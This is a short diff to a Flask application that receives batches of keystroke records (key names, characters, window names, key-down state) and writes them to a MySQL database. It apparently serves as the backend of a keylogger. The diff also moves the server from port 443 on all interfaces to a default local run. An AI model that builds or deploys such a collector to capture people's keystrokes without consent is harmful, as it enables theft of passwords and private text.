@@ -5,7 +5,7 @@ import mysql.connector
 import os
 
 #start flask app
-app = Flask(__name__)
+app = Flask(__name__, template_folder='static')
 
 #load the configurations from json file
 def load_cfg(path):
@@ -26,15 +26,6 @@ def addLog():
   data = json.loads(request.data)
 
   for key in range(len(data)):
-    # datetime = data[key]['datetime']
-    # epochTime = data[key]['epochTime']
-    # isKeyDown = data[key]['isKeyDown']
-    # windowName = data[key]['windowName']
-    # asciiCode = data[key]['asciiCode']
-    # asciiChar = data[key]['asciiChar']
-    # keyName = data[key]['keyName']
-    # isCaps = data[key]['isCaps']
-    # processedKey = data[key]['processedKey']
   
     try:
       pushDB(json.loads(data[str(key)]))
@@ -72,4 +63,5 @@ def pushDB(payload):
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int("443"), debug=True)
+    # app.run(host="0.0.0.0", port=int("443"), debug=True)
+    app.run(debug=True)
